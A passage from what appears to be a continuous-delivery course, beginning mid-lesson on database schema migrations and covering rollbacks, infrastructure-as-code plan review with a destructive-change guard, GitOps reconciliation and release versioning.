drop with trigger present: error in trigger sync after drop column: no such column: new.name

I had not expected this; SQLite validates trigger bodies when you change the schema. The order is therefore: remove the trigger first, then drop the column. After DROP TRIGGER and DROP COLUMN, the old code fails (no such column: name), which is the point of contract: only do it when no old code remains. Other engines enforce dependencies differently (dropping a column used by a view or index may be blocked, cascaded, or silently allowed); learn your engine's rules.

docs.title: Rules for migrations in a pipeline
docs.text:
• Migrations are code, versioned, reviewed, and applied by the pipeline in order, never by hand against production.
  • Forward-only, with a tested plan B. "Down" migrations that drop data are fiction in production; a rollback often means deploying a new forward fix. Where possible, make each step reversible by construction (an added nullable column can simply be left in place).
  • Separate deploy of schema from deploy of code. Run expand before the code that needs it; run contract after the code that needed the old shape is gone, usually a release or two later.
  • Test on production-sized data. A migration that takes 40 ms on a test database may lock a hundred-million-row table for minutes. Estimate from row counts, and rehearse on a restored copy.
  • Idempotent and resumable: a backfill interrupted halfway should be safe to run again (note the WHERE full_name IS NULL).
  • Check for long-running transactions and lock waits before DDL on a busy table; a DDL statement queued behind a long transaction can block every later query behind it on some engines. Use a lock timeout and retry.

docs.title: Dangerous operations, and safer shapes
docs.text: Operation Why it hurts Safer shape Rename column or table Breaks the other version Add new, dual-write, backfill, switch, drop old Add NOT NULL column without a default Fails on existing rows; may rewrite the table Add nullable, backfill, then add the constraint (validated) Change a column type Rewrites data, breaks readers New column with the new type, migrate, switch Add an index on a large table Can block writes Use the engine's online/concurrent index creation where it exists Drop a column Irreversible data loss; breaks old code Stop all use first, back up, then drop Large UPDATE in one statement Long lock, huge log Batches with pauses

docs.title: Data fixes are migrations too
docs.text: A one-off script that corrects bad rows should go through the same review and run as a pipeline job with a record of what changed, ideally keeping a copy of the old values (or relying on a verified backup) until you are sure.

docs.title: How It Actually Works
docs.text: A schema is metadata stored in the database's catalog. DDL statements modify it, and the engine takes locks on the table while doing so. Running application code holds prepared statements and cached plans that refer to column names or positions; when the catalog changes under them, they either fail (as above), re-plan, or keep working against the old definition depending on the engine. Because deployments take minutes and migrations take seconds to hours, there is always an interval in which two code versions share one schema, and the expand/contract discipline is simply the practice of making the schema a superset of what both versions need during that interval. Contract is then removing the superset's unneeded half once the interval is over.

docs.title: Common mistakes
docs.text:
• One-step renames and type changes during a rolling deploy.
  • Backfill without dual-write, leaving rows inserted by old writers incomplete.
  • Dropping the old column before the last old reader is gone, including the rollback target.
  • Testing migrations only on tiny data.
  • Down-migrations that destroy data and have never been run.
  • Hand-applied production changes that the repository does not know about.
  • Running migrations inside the app's start-up in a fleet, so ten instances race to apply them.

docs.title: Exercise
docs.text:
1. Reproduce the experiment in Python's sqlite3: do the naive rename, then expand/backfill/dual-write/contract. Add the statement that fails and record the engine's error text.
  2. Write the step list (with the deploy between each) for changing orders.status from an integer to a string enum without downtime.
  3. Make the backfill batched: update 1,000 rows at a time by primary-key range and resume safely after an interruption. Test by killing it midway.
  4. Decide what your rollback plan is if step 4 (switch reads) of your own migration shows a bug after 20 minutes in production.

docs.title: 04 · Rollbacks: Going Back, and When You Cannot
docs.text:
"We can always roll back" is the most expensive sentence in delivery, because it is only sometimes true. A rollback restores code. It cannot restore data written by the new version, messages already sent, emails delivered, money moved, or schemas altered. Planning for rollback means knowing, for each change, which of those it has touched.

What was run

No production rollback was performed. The mechanics shown use the GitOps reconcile simulator src/gitops.py (8 tests), where "rollback" is a revert of the desired state, and the SQLite behaviour from Lesson 03. The categories and the roll-forward advice are general practice, not measured results.

docs.title: What a rollback can and cannot undo
docs.text:
Change Rollback restores it? Stateless application code Yes: redeploy the previous artifact Configuration / feature flag Yes: revert the value (Lesson 02: usually the fastest) Additive schema change (new nullable column) Not needed: old code ignores it Destructive schema change (drop/rename) No: data is gone or old code breaks Data transformed in place (e.g. rounded prices) No, unless you kept the original Messages published, jobs enqueued No: consumers already saw them External effects (emails, payments, API calls) No A new version of a consumed contract (event schema) Only if consumers tolerate both

The practical test for any change before it ships: if I redeploy the previous version right after this one has run for an hour, what is wrong? If the honest answer is "the old version would corrupt or misread data the new one wrote", you do not have a rollback; you have a one-way door, and it needs the care of one (expand/contract, dual-write, or a flag).

docs.title: Rollback vs roll-forward
docs.text:
Rollback returns to a known-good version. Roll-forward ships a new fix. Choose by speed and certainty:

  • The last release only changed code, the previous artifact still exists and is compatible → rollback, because it is a known, tested state and the quickest.
  • The change is a one-way door, or a rollback would itself need a migration → roll-forward (or a flag flip), because "going back" would be a new untested operation.
  • The fix is a one-line change and your pipeline takes 5 minutes → roll-forward may be as fast as rollback, but it requires the pipeline to be healthy at the worst time. A pipeline that depends on the thing that is broken (a registry outage, a failing shared test) cannot roll forward.

Teams get hurt by committing to one dogma. The rule that scales: make rollback the default, boring, one-command operation, and know in advance which changes are exceptions.

docs.title: What makes rollback fast
docs.text:
1. Immutable, versioned artifacts (Level 1 · 07). Rollback is "deploy artifact 1.4.2 again" only if 1.4.2 still exists, byte-identical. If your pipeline rebuilds from source each time, "rollback" is a new build that might differ because a dependency moved. Retain the last N artifacts, and never delete the current plus previous release.
  2. Deploy by identifier, not by "latest". image: app:latest has no previous state to return to. Deploy by version or digest.
  3. Config in version control. Rolling back code with config you cannot reconstruct leaves a mismatched pair.
  4. One command, rehearsed. The procedure should be as simple as the forward deploy, documented in the runbook (Level 4 · 07), and exercised routinely.
  5. The previous version's dependencies still exist: its database schema, its secrets, its feature flags. A rollback to a version that needs a credential you rotated is a second outage.

docs.title: GitOps revert
docs.text: In a GitOps setup (Lesson 06) the desired state lives in Git, so rollback is git revert of the change and let the controller reconcile. The simulator test test_rollback_is_a_git_revert shows the mechanics: apply a state with web:2, apply a bad web:3, then apply web:2 again and the cluster returns to web:2; a second reconcile does nothing (idempotent). The advantage: the rollback is itself a reviewed, audited commit. The caveat: it takes effect when the controller next syncs, and it does not undo data.

docs.title: Automatic rollback
docs.text:
Canary analysis (Lesson 01) can roll back automatically. Conditions for trusting automation:

  • The signal is reliable: false rollbacks (4% in my simulation of an identical canary) are a cost, missed regressions a bigger one.
  • A missing signal fails safe: no metrics means stop and alert, never promote.
  • The rollback is idempotent and reversible: automation that cannot be re-run safely produces a second incident.
  • A human is told. An automatic rollback is an incident (the release failed) even if no customer noticed; someone must own the follow-up, or the same bad change will be re-attempted.

docs.title: Rehearsal
docs.text: A rollback you have never run is a hypothesis. Rehearse regularly: in staging after each release, and occasionally in production during a quiet period with a harmless change. Measure how long it takes and what manual steps appeared. Typical surprises: the previous artifact was garbage-collected, a config key was removed, a migration had already run, the runbook referred to a dashboard that no longer existed. Record the time-to-rollback as a metric, next to time-to-restore (Lesson 09).

docs.title: Communicating
docs.text: During a rollback, say so in the incident channel: what is being reverted, to which version, the expected duration, and how you will confirm health. Afterwards, write down why the failure was not caught earlier. "We rolled back and it was fine" is not the end: the change still needs fixing, and the reason it escaped is the real finding.

docs.title: Checklist
docs.text:
• Each change is labelled reversible or one-way before it ships.
  • The previous artifact and its dependencies are retained and verified.
  • Deploys reference immutable versions or digests, never 'latest'.
  • Rollback is a single documented command with an owner.
  • Configuration and flags roll back together with the code.
  • The time to roll back is measured in each rehearsal.
  • One-way changes use expand and contract, flags, or a canary.
  • Automatic rollbacks page a human.
  • Post-rollback review asks why the failure escaped earlier.

docs.title: How It Actually Works
docs.text: A rollback is just another deployment whose target version happens to be older, which is why the deployment mechanism and the artifact retention determine whether it works. The reconcile loop in the GitOps simulator makes this concrete: it computes the difference between desired and actual state and applies it, with no notion of "old" or "new". A revert changes the desired state back to a previous value and the loop converges. What the loop cannot do is un-apply side effects outside the declared state, which is exactly the table above: only the declared state (images, replicas, config) comes back. Everything the running system did while the new version was live is history, and managing history is the job of expand/contract schema design, idempotent consumers, and careful sequencing of one-way doors.

docs.title: Common mistakes
docs.text:
• Assuming rollback undoes data changes.
  • Deploying latest so there is nothing to go back to.
  • Garbage-collecting the previous artifact to save disk.
  • Rolling back code but not config or flags, leaving a mismatched pair.
  • Never rehearsing, then finding the procedure broken mid-incident.
  • Automatic rollback with no human notified.
  • Pipelines that cannot run when the registry or shared service is down, blocking both rollback and roll-forward.
  • Rolling back past a migration the old code cannot read.

docs.title: Exercise
docs.text:
1. For your last three releases, fill the table above: which parts could a rollback restore and which could not?
  2. Run pytest src/test_gitops.py -v -k rollback. Then modify the test so a deployment is web:3 with an extra object jobs; which operation removes it on revert, and what changes if prune=False?
  3. Write the one-command rollback procedure for a service you operate, and time a rehearsal. Note every manual step.
  4. Design the retention policy for artifacts: how many versions, how long, and what must never be deleted.

docs.title: 05 · Infrastructure Pipelines: Plan, Review, Apply
docs.text:
Infrastructure as code (Terraform, OpenTofu, Pulumi, CloudFormation, Ansible) turns servers, networks and databases into files in Git, so changes can be reviewed and repeated. The delivery pipeline for it has a different shape from an application's: the "artifact" is a plan, "deploy" is an apply that can destroy things, and the world can change underneath you between plan and apply.

What was run, and what wasn't

No infrastructure tool was run and no cloud account was used. The commands (terraform plan, apply, show -json) and the shape of the JSON plan (resource_changes[].change.actions with values such as no-op, create, update, delete, read, and a replace shown as delete plus create) are from the Terraform documentation as I know it, and could differ in your version. What I built and ran is src/planguard.py, tested with 9 pytest tests on hand-written fixtures in that shape (src/sample-plan.json). It has never read a real Terraform plan.

docs.title: The shape of an infrastructure pipeline
docs.text:
pull request:   fmt/validate → lint/policy → plan → post the plan as a PR comment → human review
merge to main:  plan again (fresh) → approval (production) → apply → record outputs → smoke test

Key ideas:

  1. Plan on every pull request, and show the plan to the reviewer. Reviewing the HCL diff alone misses effects: a one-line change to a variable may replace a database. The plan is the diff of reality.
  2. Apply what was reviewed. Plans can be saved and applied later (plan -out), which guarantees the applied change is the reviewed one, provided the real infrastructure has not changed in between; the tool refuses to apply a plan if the state moved. Without a saved plan, apply re-plans and can do something different from what the reviewer saw.
  3. Serialise applies: one at a time per state, using state locking and a pipeline concurrency group (Lesson 07).
  4. Separate credentials: the PR plan job gets read-only access; only the apply job gets write access, and only on the protected branch and environment.

docs.title: State: the file that makes it work
docs.text:
The tool keeps a state mapping each declared resource to a real object ID and its last known attributes. It is the source of both power (it knows what to change) and risk:

  • State must be shared and locked (a remote backend with locking), never on a laptop or in CI workspace files that vanish after the job.
  • State can contain secrets (database passwords appear in plain text in some resource attributes), so encrypt it and restrict access; it is as sensitive as the credentials.
  • Losing or corrupting state means the tool no longer knows what it owns: it may try to create duplicates or lose track of live resources. Version the state backend and restrict manual edits.

docs.title: Drift
docs.text: Drift is when real infrastructure differs from the code: someone changed a security group in the console during an incident. A scheduled plan (nightly, no apply) that fails when there are unexpected changes detects drift. The response is a decision, not automation: either code the change or revert it. Auto-applying to "fix" drift can undo an emergency fix or delete a resource a team created by hand, so apply on a schedule only for environments where that is explicitly accepted.

docs.title: Guarding destructive changes
docs.text:
The most dangerous line in an infrastructure PR is the one that causes a replace (destroy and recreate) of a stateful resource: a database, a disk, a bucket. Changing an immutable attribute often forces it, and the HCL diff may look innocuous.

planguard.py reads the JSON plan and blocks any resource whose action list is a delete or a replace unless its exact address is on an allowlist. It treats unknown action lists as blocked (fail closed). Fixture run:

summary: {'create': 1, 'delete': 1, 'none': 1, 'replace': 1, 'update': 1}
BLOCKED replace: aws_db_instance.main
BLOCKED delete: aws_sns_topic.old
exit=1

With the two addresses allowed explicitly on the command line it prints the same summary and exits 0. The tests check: classification of each action list; unknown actions fail closed; a safe plan passes; replace and delete are blocked; an allowlist permits exactly the listed address and not a prefix (q.old2 is not permitted by q.old); an empty plan passes; counts are right.

Design points: the allowlist is explicit and per resource, so approving a deletion is a reviewed, visible act in the PR; the guard runs in CI on the plan the reviewer is reading; and it supplements, not replaces, tool-native protections such as prevent_destroy lifecycle rules, deletion protection on databases, and backups. It also cannot know that deleting aws_sns_topic.old is fine; a human decides that.

docs.title: Policy as code
docs.text: Beyond destructive changes, organisations check plans or configuration against rules: no public storage buckets, required tags, allowed regions, instance size limits. Tools exist for this (Open Policy Agent, Sentinel, checkov and similar); I did not run any. The pipeline pattern is the same as the guard: parse the plan or config, evaluate rules, fail with a message that names the resource and the rule.

docs.title: Testing infrastructure code
docs.text: Layers, from cheap to costly: formatting and validation; static analysis; plan-level tests (assert on the plan, as above); and real apply to an ephemeral environment with checks and teardown. The last is the only one that tests that the cloud accepts your request (quotas, permissions, naming collisions) and is slow and costs money. Make ephemeral environments cheap and automatic to destroy, tag them with an owner and expiry, and sweep leaks on a schedule.

docs.title: Secrets and credentials
docs.text: Prefer short-lived credentials by OIDC federation (Lesson 08 and Level 1 · 08) over stored keys. Scope the apply role to the resources the repository manages. Do not print the plan to public logs if it contains sensitive values; Terraform marks some values as sensitive in output but the guarantee varies, so check what your logs reveal.

docs.title: Checklist
docs.text:
• Plans run on every pull request and are shown to reviewers.
  • The apply job uses a saved plan or re-checks that the plan is unchanged.
  • State is remote, locked, encrypted and access-controlled.
  • Plan jobs run with read-only credentials; apply runs only on the protected branch.
  • Destructive actions require an explicit, reviewed allowlist entry.
  • Stateful resources have deletion protection and backups.
  • Scheduled drift detection runs without applying.
  • Ephemeral test environments carry an owner tag and an expiry.

docs.title: How It Actually Works
docs.text: The tool builds a dependency graph from your configuration, refreshes state by querying the real resources, then diffs desired attributes against recorded ones to produce a plan: a list of per-resource actions. apply walks the graph in dependency order, calling the provider's create/update/delete APIs, in parallel where independent, and updates state as each finishes. An interrupted apply leaves state partially updated, and re-running plans from where it left off, which is why locking and not killing applies matter. Whether a change is an in-place update or a replace is a property of the provider's schema (which attributes are "force new"), not of your intent, which is exactly why reading the plan, and guarding it automatically, catches things code review does not.

docs.title: Common mistakes
docs.text:
• Reviewing the code diff without the plan.
  • Applying a fresh plan that differs from the reviewed one.
  • State on a laptop, unlocked, or unencrypted with secrets in it.
  • Applying from several places at once.
  • Auto-applying drift fixes that undo emergency changes.
  • Not noticing a replace of a stateful resource in a long plan.
  • Broad cloud credentials in the PR plan job.
  • No deletion protection or backups on databases, relying on review alone.

docs.title: Exercise
docs.text:
1. Run pytest src/test_planguard.py -v and python3 src/planguard.py src/sample-plan.json. Add a fixture where a resource has actions ["update"] but is a database, and discuss whether a guard on action type alone is enough.
  2. Extend the guard with a list of "never destroy" address patterns (e.g. aws_db_instance.*) that cannot be overridden by the allowlist without a second approval, and test it.
  3. Sketch the workflow with separate PR-plan and main-apply jobs, giving each its credentials and concurrency group.
  4. Describe how you would detect and respond to drift in a production account that several teams use.

docs.title: 06 · GitOps: Reconciling Desired State
docs.text:
In a push pipeline, CI runs kubectl apply or a deploy script against the target. In GitOps, the desired state of the environment lives in a Git repository, and an agent inside the environment continuously pulls it and makes reality match. The pipeline's job shrinks to building artifacts and proposing a change to the state repository; the agent does the rest.

What was run, and what wasn't

I did not run Argo CD, Flux or Kubernetes. The product behaviour described (continuous sync, pruning, health, auto-sync options) is from general knowledge of those tools and their documentation as I know it, and should be checked against current docs. What I wrote and ran is src/gitops.py, a 30-line reconcile loop over Python dictionaries with 8 pytest tests. It models the idea, not any tool's implementation.

docs.title: The model
docs.text:
• Desired state: declarative files in Git (manifests, Helm values, Kustomize overlays) describing what should exist.
  • Actual state: what is running.
  • A reconciler repeatedly computes the difference and applies it: create what is missing, update what differs, optionally delete what is extra.

The simulator's three functions are the whole idea: diff(desired, actual, prune) returns a plan of create / update / delete operations; reconcile applies it; drift reports differences whether or not they will be fixed. Run on a two-service desired state:

empty cluster      -> [('create','api',...), ('create','web',...)]
someone sets web replicas to 10 and adds an object `debug`
drift              -> {'missing': [], 'changed': ['web'], 'extra': ['debug']}
reconcile (prune)  -> [('update','web'), ('delete','debug')]
reconcile again    -> []        # converged: a second pass does nothing

Properties the tests pin down: an empty cluster gets everything created; a converged cluster produces an empty plan (idempotent); a manual change to a managed object is reverted; an extra object is deleted only when prune=True, while with prune=False it is left alone but still shows in the drift report; and applying a bad version, then the previous version, returns to the previous state.

docs.title: Why teams adopt it
docs.text:
1. Audit and review for free. Every change to an environment is a commit: author, reviewer, timestamp, diff, and the ability to ask "what changed before the outage?" with git log.
  2. Rollback is a revert (Lesson 04), with the same review as any other change.
  3. Drift is self-healing and visible. The out-of-band change you made in a panic is reverted at the next sync unless you commit it; the reconciler reports it either way.
  4. No cluster credentials in CI. In the push model your CI holds credentials strong enough to deploy to production. In the pull model, the agent inside the cluster holds them and only needs read access to Git and the registry. A compromised CI cannot push directly to production.
  5. Disaster recovery. Rebuilding a cluster is pointing a new agent at the repository.

docs.title: Costs and traps
docs.text:
• Two repositories, one change. Typically application code and environment state are separate. A release is now: build and push an image, then a commit changing the image tag in the state repository, by a bot or a pull request. Decide who does that and how it is gated.
  • Latency and surprise. Changes apply when the agent next syncs (poll interval or webhook). An "I merged but nothing happened" is usually the agent erroring, not Git. You need to monitor the reconciler itself.
  • Secrets don't belong in Git in plain text. Use sealed or encrypted secrets, or an external secrets operator that references a secret store; the manifests in Git carry only a reference.
  • Pruning is dangerous. prune=True deletes everything not in Git. A mistaken directory change that omits a manifest deletes a live object, including a stateful one. Many setups protect stateful resources with annotations or do not prune at all in production; know your tool's defaults.
  • Order and health. Resources depend on each other (a namespace before its contents, a database before the app). Tools have sync-wave or hook mechanisms for ordering; a simple dict-diff has none, which is one way the simulator is far simpler than reality.
  • State that is not in Git. Replica counts managed by an autoscaler would flap if Git declares a fixed number; the reconciler and autoscaler fight. Exclude fields owned by other controllers from comparison.
  • Not everything is Kubernetes manifests. The pattern also applies to infrastructure (Terraform controllers), but then the plan/apply guard concerns from Lesson 05 return.

docs.title: Repository layout and promotion
docs.text:
A common structure is one directory per environment (envs/dev, envs/staging, envs/prod) with shared bases and per-environment overlays. Promotion is a pull request that copies a version (the image tag or digest) from one environment's directory to the next. Because the change is a small, reviewable diff, it is easy to require approval for production only (Lesson 07 in Level 2 covers the approval caveats), and easy to see what is different between staging and production: git diff of two directories.

Avoid "branch per environment" unless you have a strong reason; long-lived branches diverge and merging them becomes the deployment process. Directories on a single branch keep differences visible.

docs.title: Image tags in a GitOps world
docs.text: A mutable tag (latest, or a re-pushed 1.4) breaks the model, because Git does not change when the image does: the reconciler sees "no difference" and the cluster may run an image Git cannot account for. Reference an immutable tag or digest in the state repository, so a change of running code is always a commit. An image-updater bot that opens a pull request when a new image appears is the usual automation.

docs.title: Health: synced is not healthy
docs.text: "Synced" means actual matches desired, not that the application works. A correct manifest pointing to a crashing image is perfectly synced. Reconcilers expose a separate health status derived from readiness probes and resource conditions. Alert on both, and make the pipeline's smoke test (not the reconciler) the judge of whether a release succeeded.

docs.title: Checklist
docs.text:
• Image references in the state repository are immutable tags or digests.
  • Secrets are referenced, never stored in plain text.
  • Pruning is reviewed, and stateful resources are protected.
  • Fields owned by other controllers are excluded from comparison.
  • The reconciler's own health is monitored and alerted.
  • Production changes require review in the state repository.
  • Environments are directories on one branch.
  • Sync status and health status are both visible on one dashboard.
  • A documented procedure covers bootstrapping a new cluster from the repository.
  • The pull request that changes production state is reviewed by someone who did not write it.

docs.title: How It Actually Works
docs.text: The reconciler is a control loop, the same pattern Kubernetes controllers use: observe actual state, compare with desired, act to reduce the difference, repeat. Because it recomputes the difference from scratch each time rather than replaying a log of past commands, it is level-triggered: a missed event or a crash only delays correction, and the next pass fixes it. That is why the simulator's second pass returns an empty plan, and why the system recovers from out-of-band changes without anyone telling it. The cost of the design is that the loop must be able to read both states cheaply and compare them reliably; normalising defaults (the cluster adds fields to objects that Git does not mention) is the unglamorous hard part in real tools, and my dictionary comparison sidesteps it completely.

docs.title: Common mistakes
docs.text:
• Mutable image tags, so Git doesn't track what runs.
  • Plain-text secrets in the state repository.
  • Pruning stateful resources by accident.
  • Not monitoring the reconciler, assuming "merged" means "applied".
  • Two controllers owning the same field (autoscaler vs Git).
  • Branch-per-environment divergence.
  • Equating "synced" with "healthy".
  • Giving CI cluster-admin credentials anyway, losing the security benefit.

docs.title: Exercise
docs.text:
1. Run pytest src/test_gitops.py -v. Add a test where actual has a field the reconciler adds itself (e.g. status) and show the loop flaps; then make diff ignore a configurable list of fields.
  2. Draft the promotion process from staging to production as a pull request: who opens it, what it contains, who approves it, what checks run.
  3. Explain what happens in each model (push and pull) if the CI system is compromised.
  4. Decide what to prune in production and what not to, and how you would protect the database object from deletion.

docs.title: 07 · Release Management: Versions, Changelogs & Trains
docs.text:
Continuous delivery does not remove the need to say what is in a release and how it relates to the previous one. Consumers of a library need to know whether an upgrade can break them; operators need to know what changed before an incident; auditors need to match running software to source. Versioning and release notes are the interface between the people who ship software and those who depend on it.

What was run

The version-bump logic in src/semrel.py and its 12 pytest tests were written and run here. Convention details (Semantic Versioning, Conventional Commits) are as I understand their public specifications; I treated the rules as conventions and did not fetch the specifications for this lesson, so read them before relying on edge cases. No release was published.

docs.title: Semantic Versioning in one paragraph
docs.text: A version MAJOR.MINOR.PATCH communicates compatibility. Increment MAJOR for incompatible changes to the public interface, MINOR for backward-compatible new functionality, PATCH for backward-compatible fixes. The scheme only works if the project defines its "public interface" and is honest about breakage. Versions below 1.0.0 are conventionally "anything may change"; many projects bump MINOR for breaking changes in that range, which is the choice my tool makes. Applications (as opposed to libraries) often use calendar versions (2026.10.3) or build numbers because "compatibility" is not meaningful to their users.

docs.title: Conventional Commits: machine-readable history
docs.text:
If every commit message has a predictable header, a tool can decide the next version and write the changelog:

fix: handle empty input                 -> PATCH
feat(api): add export                   -> MINOR
feat!: drop python 3.8                  -> MAJOR   (the ! marks a breaking change)
refactor: x
  BREAKING CHANGE: removes --old flag   -> MAJOR   (footer)
chore: / docs: / test: / ci:            -> no release

semrel.py classifies messages with a header regex plus a check for a BREAKING CHANGE: footer line, and takes the highest level among commits since the last release. Test results:

['fix: handle empty input', 'feat(api): add export', 'chore: bump deps', 'docs: typo']
  classified: patch, minor, none, none      next from 1.4.2 -> 1.5.0
adding 'feat!: drop v1'                     next from 1.4.2 -> 2.0.0   (MINOR/PATCH reset)
'feat!: x' at 0.3.1                         -> 0.4.0                   (pre-1.0 convention)
'fix: BREAKING CHANGE: is mentioned in text' -> patch                  (not a footer, so not breaking)
'fixed some stuff'                          -> none                    (unparseable, ignored)

The last two lines show the design's weakness and a safeguard: a message that does not follow the format is silently ignored, so a sloppy commit that breaks the API produces no major bump. Conventions are only as reliable as their enforcement: lint commit messages (or PR titles, if you squash-merge) in CI, and let a human override the computed version in the release PR. Note also that the tool decides from messages, not from the code: it cannot tell that a "fix" changed behaviour callers depended on. For libraries, supplement with API-compatibility checks and tests that pin the public interface.

docs.title: Changelogs for humans
docs.text: A changelog is a curated list of notable changes by version, grouped (Added, Changed, Fixed, Removed, Security), written for the reader, not copied from commit messages. Generated drafts from commit history are a good start, but "refactor: split handler" is noise for users and "fix: crash on empty cart" should say what a customer would see. Always call out: breaking changes with migration steps, deprecations with the removal date, and security fixes.

docs.title: Branching models for releases
docs.text:
Model Idea Fits Trunk-based Everyone integrates to main daily; releases are tags on main; unfinished work is hidden by flags (Lesson 02) Services deployed often Release branches Cut release/1.5 from main; only fixes go there; main moves on Products that must support several versions Gitflow-style Long-lived develop plus feature, release and hotfix branches Slower, scheduled releases; carries heavy merge overhead

Whatever the model, the rule is the same: a release is a specific commit, tagged, built once, and that artifact is promoted (Level 1 · 07). Tags in Git can be moved or deleted unless protected, so protect release tags and record the commit SHA in the artifact metadata.

docs.title: Hotfixes
docs.text: An urgent production bug needs a fix without shipping unrelated half-finished work. On a release-branch model: branch from the released tag, fix, test, tag a patch release, then merge or cherry-pick the fix forward to main so it isn't lost in the next release. The usual accident is forgetting the forward port, and the bug returns in the next release. In trunk-based development the hotfix is just a fast commit to main, which is easier as long as main is always releasable.

docs.title: Release trains and cadence
docs.text: A release train ships on a fixed schedule (every Tuesday): whatever is ready goes on, whatever is not waits for the next one. It removes negotiation ("can we squeeze one more thing in?") and makes the process routine and rehearsed. The trade-off is waiting for the train. Many teams combine a train with an escape hatch for emergencies and flag-gated features that can ship dark and turn on later.

docs.title: Release checklist as a pipeline
docs.text: Everything on a release checklist that a script can do should be done by the pipeline: compute the version, generate notes, build, run the full test and security gates, sign (Lesson 08), publish, create the tag, announce.
